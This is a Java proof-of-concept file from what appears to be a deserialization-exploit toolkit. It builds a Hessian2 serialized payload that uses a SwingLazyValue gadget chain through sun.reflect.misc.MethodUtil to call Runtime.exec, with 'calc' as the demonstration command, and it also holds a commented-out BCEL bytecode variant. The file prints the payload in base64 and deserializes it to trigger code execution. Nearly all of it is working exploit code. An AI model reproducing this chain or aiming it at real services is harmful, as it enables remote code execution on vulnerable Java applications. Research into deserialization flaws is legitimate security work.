package dev.silente.javashark.poc;

import dev.silente.javashark.gadget.jdk.GSwingLazyValue;
import dev.silente.javashark.utils.MiscUtils;
import dev.silente.javashark.utils.SerializeUtils;
import dev.silente.javashark.utils.TestUtils;

import java.lang.reflect.Method;

public class HessianWays {
    public static void main(String[] args) throws Exception {

        // BCEL
//        byte[] code = BCELCode();

        // static invoke
        Method invokeMethod = Class.forName("sun.reflect.misc.MethodUtil").getDeclaredMethod("invoke", Method.class, Object.class, Object[].class);
        Method exec = Class.forName("java.lang.Runtime").getDeclaredMethod("exec", String.class);
        byte[] code = staticInvoke(
                "sun.reflect.misc.MethodUtil",
                "invoke",
                new Object[]{invokeMethod, new Object(), new Object[]{exec, Runtime.getRuntime(), new Object[]{"calc"}}}
        );


        System.out.println(MiscUtils.base64Encode(code));
        SerializeUtils.hessian2Deserialize(code);
    }

    public static byte[] BCELCode() throws Exception {
        Object exp = GSwingLazyValue.toString2BCELCode(TestUtils.class);
        return SerializeUtils.hessian2SerializeThrowExpectToString(exp);
    }

    public static byte[] staticInvoke(String className, String methodName, Object[] params) throws Exception {
        Object exp = GSwingLazyValue.toString2StaticInvoke(
                className,
                methodName,
                params);
        return SerializeUtils.hessian2SerializeThrowExpectToString(exp);
    }
}
